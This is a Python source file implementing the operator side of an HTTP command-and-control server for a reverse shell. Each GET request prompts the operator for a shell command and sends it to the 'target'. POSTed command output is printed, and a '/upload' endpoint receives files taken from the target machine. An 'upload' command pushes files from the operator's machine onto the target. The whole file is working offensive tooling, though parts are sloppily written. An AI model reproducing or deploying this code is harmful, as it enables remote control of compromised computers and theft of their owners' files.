#!/usr/bin/env/python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi
from os import path

class HTTPHandler(BaseHTTPRequestHandler):

    def do_GET(self,file=None):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        command = input("Shell >>")
        if command.startswith("upload "):
            file=self.targetIsDownloading(command.split("upload ")[1])
            if file is not None:
                self.wfile.write(bytes(file, "utf-8"))
        else:
            self.wfile.write(bytes(command, "utf-8"))

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        if self.path=="/upload":
            self.targetIsUploading(self.rfile, self.headers)
  
        else:
            dataLength = int(self.headers["Content-Length"])
            data = self.rfile.read(dataLength)
            dataContent=data.decode("utf-8")
            print("\n", dataContent , "\n")
    
    def targetIsDownloading(self,fileToSend):
        if path.exists("uploads/"+fileToSend):
            saveName=input(f"How do you want to save {fileToSend} in the target machine in the current working directory ? ")
            file="save "+str({'file': open("uploads/"+fileToSend,"rb"),'name': saveName })
            return file
        else:
            print(f"{fileToSend} is missing in the uploads folder")
            return None


    def targetIsUploading(self, rfile, headers):
        try:
            ctype, pdict = cgi.parse_header(headers.get('content-type'))
            if ctype == 'multipart/form-data':
                f = cgi.FieldStorage( fp = rfile, headers = headers,environ={ 'REQUEST_METHOD':'POST' })
            else :
                print("Error in POST Request")
            fileContent=f['file']
            fileName = (f['name'].value).decode("utf-8")
            with open("downloads/"+fileName, 'wb') as o:
                o.write( fileContent.file.read() )
        except Exception as E:
                print (str(E))
